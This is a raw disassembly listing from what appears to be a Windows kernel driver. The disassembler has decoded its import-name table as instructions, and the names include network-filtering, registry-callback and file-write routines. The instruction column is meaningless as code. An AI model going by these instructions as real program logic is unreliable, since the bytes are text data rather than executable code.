   140015544:	69 72 65 43 6c 61 73 	imul   $0x73616c43,0x65(%rdx),%esi
   14001554b:	73 69                	jae    0x1400155b6
   14001554d:	66 79 48             	data16 jns 0x140015598
   140015550:	61                   	(bad)
   140015551:	6e                   	outsb  (%rsi),(%dx)
   140015552:	64 6c                	fs insb (%dx),(%rdi)
   140015554:	65 30 00             	xor    %al,%gs:(%rax)
   140015557:	00 e0                	add    %ah,%al
   140015559:	00 46 77             	add    %al,0x77(%rsi)
   14001555c:	70 73                	jo     0x1400155d1
   14001555e:	52                   	push   %rdx
   14001555f:	65 6c                	gs insb (%dx),(%rdi)
   140015561:	65 61                	gs (bad)
   140015563:	73 65                	jae    0x1400155ca
   140015565:	43 6c                	rex.XB insb (%dx),(%rdi)
   140015567:	61                   	(bad)
   140015568:	73 73                	jae    0x1400155dd
   14001556a:	69 66 79 48 61 6e 64 	imul   $0x646e6148,0x79(%rsi),%esp
   140015571:	6c                   	insb   (%dx),(%rdi)
   140015572:	65 30 00             	xor    %al,%gs:(%rax)
   140015575:	00 ac 00 46 77 70 73 	add    %ch,0x73707746(%rax,%rax,1)
   14001557c:	43 6f                	rex.XB outsl (%rsi),(%dx)
   14001557e:	6d                   	insl   (%dx),(%rdi)
   14001557f:	70 6c                	jo     0x1400155ed
   140015581:	65 74 65             	gs je  0x1400155e9
   140015584:	43 6c                	rex.XB insb (%dx),(%rdi)
   140015586:	61                   	(bad)
   140015587:	73 73                	jae    0x1400155fc
   140015589:	69 66 79 30 00 97 00 	imul   $0x970030,0x79(%rsi),%esp
   140015590:	46 77 70             	rex.RX ja 0x140015603
   140015593:	73 41                	jae    0x1400155d6
   140015595:	63 71 75             	movsxd 0x75(%rcx),%esi
   140015598:	69 72 65 57 72 69 74 	imul   $0x74697257,0x65(%rdx),%esi
   14001559f:	61                   	(bad)
   1400155a0:	62 6c 65 4c 61       	(bad)
   1400155a5:	79 65                	jns    0x14001560c
   1400155a7:	72 44                	jb     0x1400155ed
   1400155a9:	61                   	(bad)
   1400155aa:	74 61                	je     0x14001560d
   1400155ac:	50                   	push   %rax
   1400155ad:	6f                   	outsl  (%rsi),(%dx)
   1400155ae:	69 6e 74 65 72 30 00 	imul   $0x307265,0x74(%rsi),%ebp
   1400155b5:	00 a1 00 46 77 70    	add    %ah,0x70774600(%rcx)
   1400155bb:	73 41                	jae    0x1400155fe
   1400155bd:	70 70                	jo     0x14001562f
   1400155bf:	6c                   	insb   (%dx),(%rdi)
   1400155c0:	79 4d                	jns    0x14001560f
   1400155c2:	6f                   	outsl  (%rsi),(%dx)
   1400155c3:	64 69 66 69 65 64 4c 	imul   $0x614c6465,%fs:0x69(%rsi),%esp
   1400155ca:	61 
   1400155cb:	79 65                	jns    0x140015632
   1400155cd:	72 44                	jb     0x140015613
   1400155cf:	61                   	(bad)
   1400155d0:	74 61                	je     0x140015633
   1400155d2:	30 00                	xor    %al,(%rax)
   1400155d4:	66 77 70             	data16 ja 0x140015647
   1400155d7:	6b 63 6c 6e          	imul   $0x6e,0x6c(%rbx),%esp
   1400155db:	74 2e                	je     0x14001560b
   1400155dd:	73 79                	jae    0x140015658
   1400155df:	73 00                	jae    0x1400155e1
   1400155e1:	00 76 08             	add    %dh,0x8(%rsi)
   1400155e4:	52                   	push   %rdx
   1400155e5:	74 6c                	je     0x140015653
   1400155e7:	49 6e                	rex.WB outsb (%rsi),(%dx)
   1400155e9:	69 74 41 6e 73 69 53 	imul   $0x74536973,0x6e(%rcx,%rax,2),%esi
   1400155f0:	74 
   1400155f1:	72 69                	jb     0x14001565c
   1400155f3:	6e                   	outsb  (%rsi),(%dx)
   1400155f4:	67 00 7f 08          	add    %bh,0x8(%edi)
   1400155f8:	52                   	push   %rdx
   1400155f9:	74 6c                	je     0x140015667
   1400155fb:	49 6e                	rex.WB outsb (%rsi),(%dx)
   1400155fd:	69 74 55 6e 69 63 6f 	imul   $0x646f6369,0x6e(%rbp,%rdx,2),%esi
   140015604:	64 
   140015605:	65 53                	gs push %rbx
   140015607:	74 72                	je     0x14001567b
   140015609:	69 6e 67 00 00 a4 07 	imul   $0x7a40000,0x67(%rsi),%ebp
   140015610:	52                   	push   %rdx
   140015611:	74 6c                	je     0x14001567f
   140015613:	41 6e                	rex.B outsb (%rsi),(%dx)
   140015615:	73 69                	jae    0x140015680
   140015617:	53                   	push   %rbx
   140015618:	74 72                	je     0x14001568c
   14001561a:	69 6e 67 54 6f 55 6e 	imul   $0x6e556f54,0x67(%rsi),%ebp
   140015621:	69 63 6f 64 65 53 74 	imul   $0x74536564,0x6f(%rbx),%esp
   140015628:	72 69                	jb     0x140015693
   14001562a:	6e                   	outsb  (%rsi),(%dx)
   14001562b:	67 00 00             	add    %al,(%eax)
   14001562e:	43 08 52 74          	rex.XB or %dl,0x74(%r10)
   140015632:	6c                   	insb   (%dx),(%rdi)
   140015633:	46 72 65             	rex.RX jb 0x14001569b
   140015636:	65 55                	gs push %rbp
   140015638:	6e                   	outsb  (%rsi),(%dx)
   140015639:	69 63 6f 64 65 53 74 	imul   $0x74536564,0x6f(%rbx),%esp
   140015640:	72 69                	jb     0x1400156ab
   140015642:	6e                   	outsb  (%rsi),(%dx)
   140015643:	67 00 00             	add    %al,(%eax)
   140015646:	05 05 4b 65 53       	add    $0x53654b05,%eax
   14001564b:	65 74 45             	gs je  0x140015693
   14001564e:	76 65                	jbe    0x1400156b5
   140015650:	6e                   	outsb  (%rsi),(%dx)
   140015651:	74 00                	je     0x140015653
   140015653:	00 a3 00 45 78 41    	add    %ah,0x41784500(%rbx)
   140015659:	6c                   	insb   (%dx),(%rdi)
   14001565a:	6c                   	insb   (%dx),(%rdi)
   14001565b:	6f                   	outsl  (%rsi),(%dx)
   14001565c:	63 61 74             	movsxd 0x74(%rcx),%esp
   14001565f:	65 50                	gs push %rax
   140015661:	6f                   	outsl  (%rsi),(%dx)
   140015662:	6f                   	outsl  (%rsi),(%dx)
   140015663:	6c                   	insb   (%dx),(%rdi)
   140015664:	57                   	push   %rdi
   140015665:	69 74 68 54 61 67 00 	imul   $0xca006761,0x54(%rax,%rbp,2),%esi
   14001566c:	ca 
   14001566d:	00 45 78             	add    %al,0x78(%rbp)
   140015670:	46 72 65             	rex.RX jb 0x1400156d8
   140015673:	65 50                	gs push %rax
   140015675:	6f                   	outsl  (%rsi),(%dx)
   140015676:	6f                   	outsl  (%rsi),(%dx)
   140015677:	6c                   	insb   (%dx),(%rdi)
   140015678:	57                   	push   %rdi
   140015679:	69 74 68 54 61 67 00 	imul   $0x89006761,0x54(%rax,%rbp,2),%esi
   140015680:	89 
   140015681:	05 4d 6d 49 73       	add    $0x73496d4d,%eax
   140015686:	41                   	rex.B
   140015687:	64 64 72 65          	fs fs jb 0x1400156f0
   14001568b:	73 73                	jae    0x140015700
   14001568d:	56                   	push   %rsi
   14001568e:	61                   	(bad)
   14001568f:	6c                   	insb   (%dx),(%rdi)
   140015690:	69 64 00 00 06 03 49 	imul   $0x6f490306,0x0(%rax,%rax,1),%esp
   140015697:	6f 
   140015698:	44                   	rex.R
   140015699:	65 6c                	gs insb (%dx),(%rdi)
   14001569b:	65 74 65             	gs je  0x140015703
   14001569e:	53                   	push   %rbx
   14001569f:	79 6d                	jns    0x14001570e
   1400156a1:	62 6f 6c 69 63       	(bad)
   1400156a6:	4c 69 6e 6b 00 00 83 	imul   $0x4830000,0x6b(%rsi),%r13
   1400156ad:	04 
   1400156ae:	4b                   	rex.WXB
   1400156af:	65 49 6e             	rex.WB outsb %gs:(%rsi),(%dx)
   1400156b2:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%rcx,%rbp,2),%esi
   1400156b9:	65 
   1400156ba:	45 76 65             	rex.RB jbe 0x140015722
   1400156bd:	6e                   	outsb  (%rsi),(%dx)
   1400156be:	74 00                	je     0x1400156c0
   1400156c0:	30 05 4b 65 57 61    	xor    %al,0x6157654b(%rip)        # 0x1a158bc11
   1400156c6:	69 74 46 6f 72 53 69 	imul   $0x6e695372,0x6f(%rsi,%rax,2),%esi
   1400156cd:	6e 
   1400156ce:	67 6c                	insb   (%dx),(%edi)
   1400156d0:	65 4f 62 6a 65 63 74 	(bad)
   1400156d7:	00 c2                	add    %al,%dl
   1400156d9:	02 49 6f             	add    0x6f(%rcx),%cl
   1400156dc:	41 6c                	rex.B insb (%dx),(%rdi)
   1400156de:	6c                   	insb   (%dx),(%rdi)
   1400156df:	6f                   	outsl  (%rsi),(%dx)
   1400156e0:	63 61 74             	movsxd 0x74(%rcx),%esp
   1400156e3:	65 49 72 70          	gs rex.WB jb 0x140015757
   1400156e7:	00 0d 04 49 6f 66    	add    %cl,0x666f4904(%rip)        # 0x1a6709ff1
   1400156ed:	43 61                	rex.XB (bad)
   1400156ef:	6c                   	insb   (%dx),(%rdi)
   1400156f0:	6c                   	insb   (%dx),(%rdi)
   1400156f1:	44 72 69             	rex.R jb 0x14001575d
   1400156f4:	76 65                	jbe    0x14001575b
   1400156f6:	72 00                	jb     0x1400156f8
   1400156f8:	f0 02 49 6f          	lock add 0x6f(%rcx),%cl
   1400156fc:	43 72 65             	rex.XB jb 0x140015764
   1400156ff:	61                   	(bad)
   140015700:	74 65                	je     0x140015767
   140015702:	46 69 6c 65 00 00 1a 	imul   $0x49031a00,0x0(%rbp,%r12,2),%r13d
   140015709:	03 49 
   14001570b:	6f                   	outsl  (%rsi),(%dx)
   14001570c:	46 72 65             	rex.RX jb 0x140015774
   14001570f:	65 49 72 70          	gs rex.WB jb 0x140015783
   140015713:	00 49 03             	add    %cl,0x3(%rcx)
   140015716:	49 6f                	rex.WB outsl (%rsi),(%dx)
   140015718:	47                   	rex.RXB
   140015719:	65 74 52             	gs je  0x14001576e
   14001571c:	65 6c                	gs insb (%dx),(%rdi)
   14001571e:	61                   	(bad)
   14001571f:	74 65                	je     0x140015786
   140015721:	64 44                	fs rex.R
   140015723:	65 76 69             	gs jbe 0x14001578f
   140015726:	63 65 4f             	movsxd 0x4f(%rbp),%esp
   140015729:	62 6a 65 63 74       	(bad)
   14001572e:	00 00                	add    %al,(%rax)
   140015730:	63 06                	movsxd (%rsi),%eax
   140015732:	4f 62 52 65 66 65    	(bad)
   140015738:	72 65                	jb     0x14001579f
   14001573a:	6e                   	outsb  (%rsi),(%dx)
   14001573b:	63 65 4f             	movsxd 0x4f(%rbp),%esp
   14001573e:	62 6a 65 63 74       	(bad)
   140015743:	42 79 48             	rex.X jns 0x14001578e
   140015746:	61                   	(bad)
   140015747:	6e                   	outsb  (%rsi),(%dx)
   140015748:	64 6c                	fs insb (%dx),(%rdi)
   14001574a:	65 00 73 06          	add    %dh,%gs:0x6(%rbx)
   14001574e:	4f 62 66 44 65 72    	(bad)
   140015754:	65 66 65 72 65       	gs data16 gs jb 0x1400157be
   140015759:	6e                   	outsb  (%rsi),(%dx)
   14001575a:	63 65 4f             	movsxd 0x4f(%rbp),%esp
   14001575d:	62 6a 65 63 74       	(bad)
   140015762:	00 00                	add    %al,(%rax)
   140015764:	01 0b                	add    %ecx,(%rbx)
   140015766:	5a                   	pop    %rdx
   140015767:	77 51                	ja     0x1400157ba
   140015769:	75 65                	jne    0x1400157d0
   14001576b:	72 79                	jb     0x1400157e6
   14001576d:	49 6e                	rex.WB outsb (%rsi),(%dx)
   14001576f:	66 6f                	outsw  (%rsi),(%dx)
   140015771:	72 6d                	jb     0x1400157e0
   140015773:	61                   	(bad)
   140015774:	74 69                	je     0x1400157df
   140015776:	6f                   	outsl  (%rsi),(%dx)
   140015777:	6e                   	outsb  (%rsi),(%dx)
   140015778:	46 69 6c 65 00 00 3a 	imul   $0x5a0b3a00,0x0(%rbp,%r12,2),%r13d
   14001577f:	0b 5a 
   140015781:	77 53                	ja     0x1400157d6
   140015783:	65 74 49             	gs je  0x1400157cf
   140015786:	6e                   	outsb  (%rsi),(%dx)
   140015787:	66 6f                	outsw  (%rsi),(%dx)
   140015789:	72 6d                	jb     0x1400157f8
   14001578b:	61                   	(bad)
   14001578c:	74 69                	je     0x1400157f7
   14001578e:	6f                   	outsl  (%rsi),(%dx)
   14001578f:	6e                   	outsb  (%rsi),(%dx)
   140015790:	46 69 6c 65 00 00 1c 	imul   $0x5a0b1c00,0x0(%rbp,%r12,2),%r13d
   140015797:	0b 5a 
   140015799:	77 52                	ja     0x1400157ed
   14001579b:	65 61                	gs (bad)
   14001579d:	64 46 69 6c 65 00 00 	imul   $0x5a0b6300,%fs:0x0(%rbp,%r12,2),%r13d
   1400157a4:	63 0b 5a 
   1400157a7:	77 57                	ja     0x140015800
   1400157a9:	72 69                	jb     0x140015814
   1400157ab:	74 65                	je     0x140015812
   1400157ad:	46 69 6c 65 00 89 0a 	imul   $0x775a0a89,0x0(%rbp,%r12,2),%r13d
   1400157b4:	5a 77 
   1400157b6:	43 6c                	rex.XB insb (%dx),(%rdi)
   1400157b8:	6f                   	outsl  (%rsi),(%dx)
   1400157b9:	73 65                	jae    0x140015820
   1400157bb:	00 13                	add    %dl,(%rbx)
   1400157bd:	03 49 6f             	add    0x6f(%rcx),%ecx
   1400157c0:	46 69 6c 65 4f 62 6a 	imul   $0x63656a62,0x4f(%rbp,%r12,2),%r13d
   1400157c7:	65 63 
   1400157c9:	74 54                	je     0x14001581f
   1400157cb:	79 70                	jns    0x14001583d
   1400157cd:	65 00 00             	add    %al,%gs:(%rax)
   1400157d0:	c1 0b 73             	rorl   $0x73,(%rbx)
   1400157d3:	74 72                	je     0x140015847
   1400157d5:	63 68 72             	movsxd 0x72(%rax),%ebp
   1400157d8:	00 00                	add    %al,(%rax)
   1400157da:	c6                   	(bad)
   1400157db:	0b 73 74             	or     0x74(%rbx),%esi
   1400157de:	72 6e                	jb     0x14001584e
   1400157e0:	63 61 74             	movsxd 0x74(%rcx),%esp
   1400157e3:	00 ca                	add    %cl,%dl
   1400157e5:	0b 73 74             	or     0x74(%rbx),%esi
   1400157e8:	72 6e                	jb     0x140015858
   1400157ea:	63 70 79             	movsxd 0x79(%rax),%esi
   1400157ed:	5f                   	pop    %rdi
   1400157ee:	73 00                	jae    0x1400157f0
   1400157f0:	ce                   	(bad)
   1400157f1:	0b 73 74             	or     0x74(%rbx),%esi
   1400157f4:	72 73                	jb     0x140015869
   1400157f6:	74 72                	je     0x14001586a
   1400157f8:	00 00                	add    %al,(%rax)
   1400157fa:	f6 04 4b 65          	testb  $0x65,(%rbx,%rcx,2)
   1400157fe:	52                   	push   %rdx
   1400157ff:	65 73 65             	gs jae 0x140015867
   140015802:	74 45                	je     0x140015849
   140015804:	76 65                	jbe    0x14001586b
   140015806:	6e                   	outsb  (%rsi),(%dx)
   140015807:	74 00                	je     0x140015809
   140015809:	00 ae 05 4d 6d 50    	add    %ch,0x506d4d05(%rsi)
   14001580f:	72 6f                	jb     0x140015880
   140015811:	62 65 41 6e 64       	(bad)
   140015816:	4c 6f                	rex.WR outsl (%rsi),(%dx)
   140015818:	63 6b 50             	movsxd 0x50(%rbx),%ebp
   14001581b:	61                   	(bad)
   14001581c:	67 65 73 00          	addr32 gs jae 0x140015820
   140015820:	c5 05 4d             	(bad)
   140015823:	6d                   	insl   (%dx),(%rdi)
   140015824:	55                   	push   %rbp
   140015825:	6e                   	outsb  (%rsi),(%dx)
   140015826:	6c                   	insb   (%dx),(%rdi)
   140015827:	6f                   	outsl  (%rsi),(%dx)
   140015828:	63 6b 50             	movsxd 0x50(%rbx),%ebp
   14001582b:	61                   	(bad)
   14001582c:	67 65 73 00          	addr32 gs jae 0x140015830
   140015830:	c4 02 49 6f          	(bad)
   140015834:	41 6c                	rex.B insb (%dx),(%rdi)
   140015836:	6c                   	insb   (%dx),(%rdi)
   140015837:	6f                   	outsl  (%rsi),(%dx)
   140015838:	63 61 74             	movsxd 0x74(%rcx),%esp
   14001583b:	65 4d                	gs rex.WRB
   14001583d:	64 6c                	fs insb (%dx),(%rdi)
   14001583f:	00 1d 03 49 6f 46    	add    %bl,0x466f4903(%rip)        # 0x18670a148
   140015845:	72 65                	jb     0x1400158ac
   140015847:	65 4d                	gs rex.WRB
   140015849:	64 6c                	fs insb (%dx),(%rdi)
   14001584b:	00 ad 03 49 6f 52    	add    %ch,0x526f4903(%rbp)
   140015851:	65 75 73             	gs jne 0x1400158c7
   140015854:	65 49 72 70          	gs rex.WB jb 0x1400158c8
   140015858:	00 00                	add    %al,(%rax)
   14001585a:	65 0b 5f 5f          	or     %gs:0x5f(%rdi),%ebx
   14001585e:	43 5f                	rex.XB pop %r15
   140015860:	73 70                	jae    0x1400158d2
   140015862:	65 63 69 66          	movsxd %gs:0x66(%rcx),%ebp
   140015866:	69 63 5f 68 61 6e 64 	imul   $0x646e6168,0x5f(%rbx),%esp
   14001586d:	6c                   	insb   (%dx),(%rdi)
   14001586e:	65 72 00             	gs jb  0x140015871
   140015871:	00 5e 00             	add    %bl,0x0(%rsi)
   140015874:	44 62 67 50 72 69    	(bad)
   14001587a:	6e                   	outsb  (%rsi),(%dx)
   14001587b:	74 45                	je     0x1400158c2
   14001587d:	78 00                	js     0x14001587f
   14001587f:	00 d7                	add    %dl,%bh
   140015881:	0b 76 44             	or     0x44(%rsi),%esi
   140015884:	62 67 50 72 69       	(bad)
   140015889:	6e                   	outsb  (%rsi),(%dx)
   14001588a:	74 45                	je     0x1400158d1
   14001588c:	78 00                	js     0x14001588e
   14001588e:	d8 0b                	fmuls  (%rbx)
   140015890:	76 44                	jbe    0x1400158d6
   140015892:	62 67 50 72 69       	(bad)
   140015897:	6e                   	outsb  (%rsi),(%dx)
   140015898:	74 45                	je     0x1400158df
   14001589a:	78 57                	js     0x1400158f3
   14001589c:	69 74 68 50 72 65 66 	imul   $0x69666572,0x50(%rax,%rbp,2),%esi
   1400158a3:	69 
   1400158a4:	78 00                	js     0x1400158a6
   1400158a6:	4d 09 52 74          	or     %r10,0x74(%r10)
   1400158aa:	6c                   	insb   (%dx),(%rdi)
   1400158ab:	54                   	push   %rsp
   1400158ac:	69 6d 65 54 6f 54 69 	imul   $0x69546f54,0x65(%rbp),%ebp
   1400158b3:	6d                   	insl   (%dx),(%rdi)
   1400158b4:	65 46 69 65 6c 64 73 	rex.RX imul $0x34007364,%gs:0x6c(%rbp),%r12d
   1400158bb:	00 34 
   1400158bd:	01 45 78             	add    %eax,0x78(%rbp)
   1400158c0:	53                   	push   %rbx
   1400158c1:	79 73                	jns    0x140015936
   1400158c3:	74 65                	je     0x14001592a
   1400158c5:	6d                   	insl   (%dx),(%rdi)
   1400158c6:	54                   	push   %rsp
   1400158c7:	69 6d 65 54 6f 4c 6f 	imul   $0x6f4c6f54,0x65(%rbp),%ebp
   1400158ce:	63 61 6c             	movsxd 0x6c(%rcx),%esp
   1400158d1:	54                   	push   %rsp
   1400158d2:	69 6d 65 00 b9 0b 73 	imul   $0x730bb900,0x65(%rbp),%ebp
   1400158d9:	70 72                	jo     0x14001594d
   1400158db:	69 6e 74 66 00 8e 0b 	imul   $0xb8e0066,0x74(%rsi),%ebp
   1400158e2:	5f                   	pop    %rdi
   1400158e3:	76 73                	jbe    0x140015958
   1400158e5:	6e                   	outsb  (%rsi),(%dx)
   1400158e6:	77 70                	ja     0x140015958
   1400158e8:	72 69                	jb     0x140015953
   1400158ea:	6e                   	outsb  (%rsi),(%dx)
   1400158eb:	74 66                	je     0x140015953
   1400158ed:	00 59 04             	add    %bl,0x4(%rcx)
   1400158f0:	4b                   	rex.WXB
   1400158f1:	65 45 6e             	rex.RB outsb %gs:(%rsi),(%dx)
   1400158f4:	74 65                	je     0x14001595b
   1400158f6:	72 43                	jb     0x14001593b
   1400158f8:	72 69                	jb     0x140015963
   1400158fa:	74 69                	je     0x140015965
   1400158fc:	63 61 6c             	movsxd 0x6c(%rcx),%esp
   1400158ff:	52                   	push   %rdx
   140015900:	65 67 69 6f 6e 00 a5 	imul   $0x4b04a500,%gs:0x6e(%edi),%ebp
   140015907:	04 4b 
   140015909:	65 4c                	gs rex.WR
   14001590b:	65 61                	gs (bad)
   14001590d:	76 65                	jbe    0x140015974
   14001590f:	43 72 69             	rex.XB jb 0x14001597b
   140015912:	74 69                	je     0x14001597d
   140015914:	63 61 6c             	movsxd 0x6c(%rcx),%esp
   140015917:	52                   	push   %rdx
   140015918:	65 67 69 6f 6e 00 89 	imul   $0x50078900,%gs:0x6e(%edi),%ebp
   14001591f:	07 50 
   140015921:	73 54                	jae    0x140015977
   140015923:	65 72 6d             	gs jb  0x140015993
   140015926:	69 6e 61 74 65 53 79 	imul   $0x79536574,0x61(%rsi),%ebp
   14001592d:	73 74                	jae    0x1400159a3
   14001592f:	65 6d                	gs insl (%dx),(%rdi)
   140015931:	54                   	push   %rsp
   140015932:	68 72 65 61 64       	push   $0x64616572
   140015937:	00 02                	add    %al,(%rdx)
   140015939:	05 4b 65 53 65       	add    $0x6553654b,%eax
   14001593e:	74 42                	je     0x140015982
   140015940:	61                   	(bad)
   140015941:	73 65                	jae    0x1400159a8
   140015943:	50                   	push   %rax
   140015944:	72 69                	jb     0x1400159af
   140015946:	6f                   	outsl  (%rsi),(%dx)
   140015947:	72 69                	jb     0x1400159b2
   140015949:	74 79                	je     0x1400159c4
   14001594b:	54                   	push   %rsp
   14001594c:	68 72 65 61 64       	push   $0x64616572
   140015951:	00 57 00             	add    %dl,0x0(%rdi)
   140015954:	43 6d                	rex.XB insl (%dx),(%rdi)
   140015956:	55                   	push   %rbp
   140015957:	6e                   	outsb  (%rsi),(%dx)
   140015958:	52                   	push   %rdx
   140015959:	65 67 69 73 74 65 72 	imul   $0x61437265,%gs:0x74(%ebx),%esi
   140015960:	43 61 
   140015962:	6c                   	insb   (%dx),(%rdi)
   140015963:	6c                   	insb   (%dx),(%rdi)
   140015964:	62 61 63 6b 00       	(bad)
   140015969:	00 54 00 43          	add    %dl,0x43(%rax,%rax,1)
   14001596d:	6d                   	insl   (%dx),(%rdi)
   14001596e:	52                   	push   %rdx
   14001596f:	65 67 69 73 74 65 72 	imul   $0x61437265,%gs:0x74(%ebx),%esi
   140015976:	43 61 
   140015978:	6c                   	insb   (%dx),(%rdi)
   140015979:	6c                   	insb   (%dx),(%rdi)
   14001597a:	62 61 63 6b 45       	(bad)
   14001597f:	78 00                	js     0x140015981
   140015981:	00 4d 00             	add    %cl,0x0(%rbp)
   140015984:	43 6d                	rex.XB insl (%dx),(%rdi)
   140015986:	43 61                	rex.XB (bad)
   140015988:	6c                   	insb   (%dx),(%rdi)
   140015989:	6c                   	insb   (%dx),(%rdi)
   14001598a:	62 61 63 6b 47       	(bad)
   14001598f:	65 74 4b             	gs je  0x1400159dd
   140015992:	65 79 4f             	gs jns 0x1400159e4
   140015995:	62 6a 65 63 74       	(bad)
   14001599a:	49                   	rex.WB
   14001599b:	44 00 00             	add    %r8b,(%rax)
   14001599e:	c8 0b 73 74          	enter  $0x730b,$0x74
   1400159a2:	72 6e                	jb     0x140015a12
   1400159a4:	63 6d 70             	movsxd 0x70(%rbp),%ebp
   1400159a7:	00 c9                	add    %cl,%cl
   1400159a9:	0b 73 74             	or     0x74(%rbx),%esi
   1400159ac:	72 6e                	jb     0x140015a1c
   1400159ae:	63 70 79             	movsxd 0x79(%rax),%esi
   1400159b1:	00 e6                	add    %ah,%dh
   1400159b3:	0b 77 63             	or     0x63(%rdi),%esi
   1400159b6:	73 6e                	jae    0x140015a26
   1400159b8:	63 6d 70             	movsxd 0x70(%rbp),%ebp
   1400159bb:	00 96 00 45 78 41    	add    %dl,0x41784500(%rsi)
   1400159c1:	63 71 75             	movsxd 0x75(%rcx),%esi
   1400159c4:	69 72 65 53 70 69 6e 	imul   $0x6e697053,0x65(%rdx),%esi
   1400159cb:	4c 6f                	rex.WR outsl (%rsi),(%dx)
   1400159cd:	63 6b 45             	movsxd 0x45(%rbx),%ebp
   1400159d0:	78 63                	js     0x140015a35
   1400159d2:	6c                   	insb   (%dx),(%rdi)
   1400159d3:	75 73                	jne    0x140015a48
   1400159d5:	69 76 65 00 00 20 01 	imul   $0x1200000,0x65(%rsi),%esi
   1400159dc:	45 78 52             	rex.RB js 0x140015a31
   1400159df:	65 6c                	gs insb (%dx),(%rdi)
   1400159e1:	65 61                	gs (bad)
   1400159e3:	73 65                	jae    0x140015a4a
   1400159e5:	53                   	push   %rbx
   1400159e6:	70 69                	jo     0x140015a51
   1400159e8:	6e                   	outsb  (%rsi),(%dx)
   1400159e9:	4c 6f                	rex.WR outsl (%rsi),(%dx)
   1400159eb:	63 6b 45             	movsxd 0x45(%rbx),%ebp
   1400159ee:	78 63                	js     0x140015a53
   1400159f0:	6c                   	insb   (%dx),(%rdi)
   1400159f1:	75 73                	jne    0x140015a66
   1400159f3:	69 76 65 00 00 e6 07 	imul   $0x7e60000,0x65(%rsi),%esi
   1400159fa:	52                   	push   %rdx
   1400159fb:	74 6c                	je     0x140015a69
   1400159fd:	43 72 65             	rex.XB jb 0x140015a65
   140015a00:	61                   	(bad)
   140015a01:	74 65                	je     0x140015a68
   140015a03:	53                   	push   %rbx
   140015a04:	65 63 75 72          	movsxd %gs:0x72(%rbp),%esi
   140015a08:	69 74 79 44 65 73 63 	imul   $0x72637365,0x44(%rcx,%rdi,2),%esi
   140015a0f:	72 
   140015a10:	69 70 74 6f 72 00 2e 	imul   $0x2e00726f,0x74(%rax),%esi
   140015a17:	09 52 74             	or     %edx,0x74(%rdx)
   140015a1a:	6c                   	insb   (%dx),(%rdi)
   140015a1b:	53                   	push   %rbx
   140015a1c:	65 74 44             	gs je  0x140015a63
   140015a1f:	61                   	(bad)
   140015a20:	63 6c 53 65          	movsxd 0x65(%rbx,%rdx,2),%ebp
   140015a24:	63 75 72             	movsxd 0x72(%rbp),%esi
   140015a27:	69 74 79 44 65 73 63 	imul   $0x72637365,0x44(%rcx,%rdi,2),%esi
   140015a2e:	72 
   140015a2f:	69 70 74 6f 72 00 00 	imul   $0x726f,0x74(%rax),%esi
   140015a36:	8f 04 4b             	pop    (%rbx,%rcx,2)
   140015a39:	65 49 6e             	rex.WB outsb %gs:(%rsi),(%dx)
   140015a3c:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%rcx,%rbp,2),%esi
   140015a43:	65 
   140015a44:	54                   	push   %rsp
   140015a45:	69 6d 65 72 45 78 00 	imul   $0x784572,0x65(%rbp),%ebp
   140015a4c:	17                   	(bad)
   140015a4d:	05 4b 65 53 65       	add    $0x6553654b,%eax
   140015a52:	74 54                	je     0x140015aa8
   140015a54:	69 6d 65 72 45 78 00 	imul   $0x784572,0x65(%rbp),%ebp
   140015a5b:	00 e0                	add    %ah,%al
   140015a5d:	06                   	(bad)
   140015a5e:	50                   	push   %rax
   140015a5f:	73 43                	jae    0x140015aa4
   140015a61:	72 65                	jb     0x140015ac8
   140015a63:	61                   	(bad)
   140015a64:	74 65                	je     0x140015acb
   140015a66:	53                   	push   %rbx
   140015a67:	79 73                	jns    0x140015adc
   140015a69:	74 65                	je     0x140015ad0
   140015a6b:	6d                   	insl   (%dx),(%rdi)
   140015a6c:	54                   	push   %rsp
   140015a6d:	68 72 65 61 64       	push   $0x64616572
   140015a72:	00 00                	add    %al,(%rax)
   140015a74:	98                   	cwtl
   140015a75:	0a 5a 77             	or     0x77(%rdx),%bl
   140015a78:	43 72 65             	rex.XB jb 0x140015ae0
   140015a7b:	61                   	(bad)
   140015a7c:	74 65                	je     0x140015ae3
   140015a7e:	4b                   	rex.WXB
   140015a7f:	65 79 00             	gs jns 0x140015a82
   140015a82:	d9 0a                	(bad) (%rdx)
   140015a84:	5a                   	pop    %rdx
   140015a85:	77 4f                	ja     0x140015ad6
   140015a87:	70 65                	jo     0x140015aee
   140015a89:	6e                   	outsb  (%rsi),(%dx)
   140015a8a:	4b                   	rex.WXB
   140015a8b:	65 79 00             	gs jns 0x140015a8e
   140015a8e:	b9 0a 5a 77 46       	mov    $0x46775a0a,%ecx
   140015a93:	6c                   	insb   (%dx),(%rdi)
   140015a94:	75 73                	jne    0x140015b09
   140015a96:	68 4b 65 79 00       	push   $0x79654b
   140015a9b:	00 17                	add    %dl,(%rdi)
   140015a9d:	0b 5a 77             	or     0x77(%rdx),%ebx
   140015aa0:	51                   	push   %rcx
   140015aa1:	75 65                	jne    0x140015b08
   140015aa3:	72 79                	jb     0x140015b1e
   140015aa5:	56                   	push   %rsi
   140015aa6:	61                   	(bad)
   140015aa7:	6c                   	insb   (%dx),(%rdi)
   140015aa8:	75 65                	jne    0x140015b0f
   140015aaa:	4b                   	rex.WXB
   140015aab:	65 79 00             	gs jns 0x140015aae
   140015aae:	4f 0b 5a 77          	rex.WRXB or 0x77(%r10),%r11
   140015ab2:	53                   	push   %rbx
   140015ab3:	65 74 56             	gs je  0x140015b0c
   140015ab6:	61                   	(bad)
   140015ab7:	6c                   	insb   (%dx),(%rdi)
   140015ab8:	75 65                	jne    0x140015b1f
   140015aba:	4b                   	rex.WXB
   140015abb:	65 79 00             	gs jns 0x140015abe
   140015abe:	1b 06                	sbb    (%rsi),%eax
   140015ac0:	4e 74 51             	rex.WRX je 0x140015b14
   140015ac3:	75 65                	jne    0x140015b2a
   140015ac5:	72 79                	jb     0x140015b40
   140015ac7:	49 6e                	rex.WB outsb (%rsi),(%dx)
   140015ac9:	66 6f                	outsw  (%rsi),(%dx)
   140015acb:	72 6d                	jb     0x140015b3a
   140015acd:	61                   	(bad)
   140015ace:	74 69                	je     0x140015b39
   140015ad0:	6f                   	outsl  (%rsi),(%dx)
   140015ad1:	6e                   	outsb  (%rsi),(%dx)
   140015ad2:	54                   	push   %rsp
   140015ad3:	6f                   	outsl  (%rsi),(%dx)
   140015ad4:	6b 65 6e 00          	imul   $0x0,0x6e(%rbp),%esp
   140015ad8:	c8 08 52 74          	enter  $0x5208,$0x74
